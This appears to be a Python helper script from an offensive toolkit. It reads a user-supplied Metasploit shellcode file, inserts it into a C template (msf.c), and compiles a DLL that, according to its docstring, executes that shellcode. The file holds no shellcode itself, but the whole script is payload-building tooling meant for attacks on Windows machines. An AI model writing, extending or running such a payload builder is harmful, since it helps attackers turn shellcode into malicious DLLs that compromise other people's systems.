import subprocess
import os


def inplace_change(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        s = s.replace(old_string, new_string)
        f.write(s)


def build_msf_dll():
    """
    build dll that executes metasploit shellcode
    """
    shellcodeFile = input("[+] Enter Path to Shellcode file : ")
    try:
        with open(shellcodeFile, "r") as readin_code:
            c_array_msf = readin_code.read()
            print("[+] Using : ")
            print(c_array_msf)

            print("[i] Writing to Source DLL file.")
            inplace_change("msf.c", "{{shellcodehere}}", c_array_msf)
            print("[i] Building DLL.")
            # Mingw32, to support my windows envoironment
            if(os.name == "nt"):
                subprocess.call(["mingw32-make", "msf"])
            else:
                subprocess.call(["make", "msf"])

            if(not os.path.isfile("msf.dll")):
                print("[X] An Error occured when building Dll.")
            else:
                inplace_change("msf.c", c_array_msf, "{{shellcodehere}}")

    except Exception as e:
        print("[X] Error : " + str(e))
